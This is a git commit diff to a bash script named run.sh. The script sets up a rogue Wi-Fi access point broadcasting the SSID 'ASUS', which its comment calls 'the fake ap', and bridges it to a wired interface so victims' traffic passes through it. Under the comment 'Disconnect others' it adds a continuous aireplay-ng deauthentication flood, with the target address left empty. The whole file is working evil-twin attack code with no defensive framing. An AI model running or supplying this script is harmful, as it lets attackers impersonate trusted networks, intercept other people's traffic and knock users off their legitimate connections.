bc9cc9cb4eadcef348e87baa83bab7a1b7f37f08
jtiwakiri <jtiwakiri@gmail.com>
2016-08-24 13:00:38 -0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,10 +1,25 @@
 #!/bin/bash
 
+# Edit the /etc/hostapd/hostapd.conf configuration file
+iface=$(sudo airmon-ng | grep "Ralink")
+iface=${iface:0:5}
+{
+  echo "interface=$iface"
+  echo "driver=nl80211"
+  echo "ssid=ASUS"
+  echo "channel=6"
+} > /etc/hostapd/hostapd.conf
+
+# Create the bridge and add the interfaces to it
 sudo ip addr flush dev eth0
-sudo iw dev wlan1 set 4addr on
+sudo iw dev $iface set 4addr on
 sudo brctl addbr br0
-sudo brctl addif br0 eth0 wlan1
+sudo brctl addif br0 eth0 $iface
 sudo ifconfig br0 down
 sudo ifconfig br0 up
 
+# Start the fake ap
 sudo hostapd /etc/hostapd/hostapd.conf
+
+#Disconnect others
+sudo aireplay-ng --deauth 0 -a
